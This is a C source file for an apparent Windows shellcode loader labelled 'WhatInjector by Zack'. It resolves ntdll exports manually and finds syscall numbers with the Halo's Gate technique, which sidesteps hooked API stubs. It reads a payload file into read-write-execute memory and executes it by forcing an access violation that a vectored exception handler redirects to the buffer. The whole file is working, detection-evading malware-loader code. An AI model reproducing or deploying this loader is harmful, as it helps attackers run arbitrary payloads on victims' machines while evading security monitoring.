#include "include/HalosGate.h"
#include "include/define.h"

void RtlInitUnicodeString(UNICODE_STRING *u, const wchar_t *s) {
    if (!s) { u->Length = u->MaximumLength = 0; u->Buffer = NULL; return; }
    size_t len = wcslen(s);
    u->Length = (USHORT)(len * sizeof(wchar_t));
    u->MaximumLength = u->Length + sizeof(wchar_t);
    u->Buffer = (PWSTR)s;
}

ULONGLONG Handler(PEXCEPTION_POINTERS pException){
	if (pException->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION){
		pException->ContextRecord->Rip = (ULONGLONG)BaseAddress;
		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

PVOID ResolveAddress(DWORD apiStrlen, LPSTR apiName){
	LPVOID pApiAddress = getApiAddr(apiStrlen, apiName, pNtdll, pEAT, pENPT, pEOT);
	printf("[DEBUG] Function %s address | 0x%p\n", apiName, pApiAddress);
	return pApiAddress;
}

int HalosGateFindSSN(LPVOID FunctionAddress){
	DWORD index = 0; 
	DWORD SSN = 0;
	while (SSN == 0) {
		index++;
		SSN = halosGateUp(FunctionAddress, index);
		if (SSN) {
			SSN = SSN - index;
			return SSN;
		}
		SSN = halosGateDown(FunctionAddress, index);
		if (SSN) {
			SSN = SSN + index;
			return SSN;
		}
	}
	return 0;
}

int main() {
	HMODULE hModule = GetModuleHandle("ntdll");
	RtlAddVectoredExceptionHandlerStruct RtlAddVectoredExceptionHandler = (RtlAddVectoredExceptionHandlerStruct)GetProcAddress(hModule, (LPCSTR)"RtlAddVectoredExceptionHandler");
	wchar_t *filename = L"\\??\\C:\\Users\\xclmr\\OneDrive\\Documentos\\sbof\\SEH\\zack.bin";
	ZeroMemory(&OA, sizeof(OA));
	ZeroMemory(&IO, sizeof(IO));
	ZeroMemory(&FS, sizeof(FS));

	printf("[DEBUG] WhatInjector by Zack\n");

	pNtdll = getntdll();
	printf("[DEBUG] NTDLL Address | 0x%p\n", pNtdll);
	
	pExportTable = getExportTable(pNtdll);
	printf("[DEBUG] Export Table Address | 0x%p\n", pExportTable);
	
	pEAT = getExAddressTable(pExportTable, pNtdll);
	printf("[DEBUG] Export Address Table | 0x%p\n", pEAT);
	
	pEOT = getExOrdinalTable(pExportTable, pNtdll);
	printf("[DEBUG] Export Ordinal Table | 0x%p\n", pEOT);
	
	pENPT = getExNamePointerTable(pExportTable, pNtdll);
	printf("[DEBUG] Export Name Pointer Table | 0x%p\n", pENPT);
	
	LPVOID NtAllocateAddr = ResolveAddress(strlen("NtAllocateVirtualMemory"), "NtAllocateVirtualMemory");
	ssnAllocate = HalosGateFindSSN(NtAllocateAddr);
	syscallAllocate = NtAllocateAddr + 0x12;

	LPVOID NtReadFileAddr = ResolveAddress(strlen("NtReadFile"), "NtReadFile");
	ssnReadFile = HalosGateFindSSN(NtReadFileAddr);
	syscallRead = NtReadFileAddr + 0x12;

	LPVOID NtOpenFileAddr = ResolveAddress(strlen("NtOpenFile"), "NtOpenFile");
	ssnOpenFile = HalosGateFindSSN(NtOpenFileAddr);
	syscallOpen = NtOpenFileAddr + 0x12;

	LPVOID NtFileInformationAddr = ResolveAddress(strlen("NtQueryInformationFile"), "NtQueryInformationFile");
	ssnFileInformation = HalosGateFindSSN(NtFileInformationAddr);
	syscallFile = NtFileInformationAddr + 0x12;

	RtlInitUnicodeString(&STR, filename);
	InitializeObjectAttributes(&OA, &STR, OBJ_CASE_INSENSITIVE, NULL, NULL);

	NtOpenFileHalos(&hFile, FILE_READ_DATA | SYNCHRONIZE, &OA, &IO, 0, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_ALERT);
	if (IO.Status != STATUS_SUCCESS){
		printf("[DEBUG] NtOpenFile has failed!\n");
		printf("[DEBUG] Status | 0x%x\n", IO.Status);
	}
	printf("[DEBUG] File %ls has been opened\n", filename);

	NtQueryInformationFileHalos(hFile, &IO, &FS, sizeof(FS), FileStandardInformation);
	if (IO.Status != STATUS_SUCCESS){
		printf("[DEBUG] NtQueryInformationFile has failed!\n");
		printf("[DEBUG] Status | 0x%x\n", IO.Status);
	}
	printf("[DEBUG] File size is %ld bytes\n", FS.EndOfFile.QuadPart);

	hProcess = GetCurrentProcess();
	if (hProcess == 0){
		printf("[DEBUG] GetCurrentProcess has failed!\n");
		printf("[DEBUG] Status | 0x%x\n", GetLastError());
	}
	printf("[DEBUG] Handle process has getted\n");

	RegionSize = FS.EndOfFile.QuadPart;

	ntStatus = NtAllocateVirtualMemoryHalos(hProcess, &BaseAddress, 0, &RegionSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (ntStatus != STATUS_SUCCESS){
		printf("[DEBUG] NtAllocateVirtualMemory has failed!\n");
		printf("[DEBUG] Status | 0x%x\n", ntStatus);
	}
	printf("[DEBUG] Address allocated at 0x%p\n", BaseAddress);

	NtReadFileHalos(hFile, NULL, NULL, NULL, &IO, BaseAddress, RegionSize, NULL, NULL);
	if (IO.Status != STATUS_SUCCESS){
		printf("[DEBUG] NtReadFile has failed!\n");
		printf("[DEBUG] Status | 0x%x\n", IO.Status);
	}
	printf("[DEBUG] %ld bytes has been copied at 0x%p\n", RegionSize, BaseAddress);
	
	RtlAddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)Handler);
	printf("[DEBUG] VEH Handler has added\n");
	
	int *i = NULL;
	*i = 2;

}